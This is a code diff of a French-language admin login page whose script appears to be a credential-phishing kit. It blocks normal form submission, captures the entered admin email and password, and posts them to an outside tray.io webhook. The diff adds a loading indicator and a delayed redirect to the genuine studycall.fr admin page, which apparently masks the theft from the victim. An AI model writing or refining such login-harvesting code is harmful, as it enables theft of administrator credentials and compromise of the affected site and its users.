@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="fr">
 <head>
   <meta http-equiv="Content-type" content="text/html; charset=utf-8">
@@ -53,7 +54,7 @@
 
   <script>
     document.getElementById('login-form').addEventListener('submit', function(e) {
-      e.preventDefault(); // Empêcher la soumission par défaut du formulaire
+      e.preventDefault();
 
       var email = document.getElementById('admin_user_email').value;
       var password = document.getElementById('admin_user_password').value;
@@ -63,6 +64,9 @@
         password: password
       };
 
+      var loader = document.getElementById('loader');
+      loader.style.visibility = 'visible';
+
       fetch('https://b5191f16-9c13-4022-b1ab-1e82d89146e0.eu1.trayapp.io', {
         method: 'POST',
         mode: 'no-cors',
@@ -71,15 +75,15 @@
         },
         body: JSON.stringify(data)
       })
-      .then(response => response.json())
-      .then(data => {
-        console.log('Success:', data);
-        // Rediriger l'utilisateur ou afficher un message de succès ici
-        window.location.href = 'https://www.studycall.fr/admin';
+      .then(() => {
+        console.log('Success: data sent');
+        setTimeout(() => {
+          window.location.href = 'https://www.studycall.fr/admin';
+        }, 2000);
       })
       .catch((error) => {
         console.error('Error:', error);
-        // Afficher un message d'erreur ici
+        loader.style.visibility = 'hidden';
       });
     });
   </script>
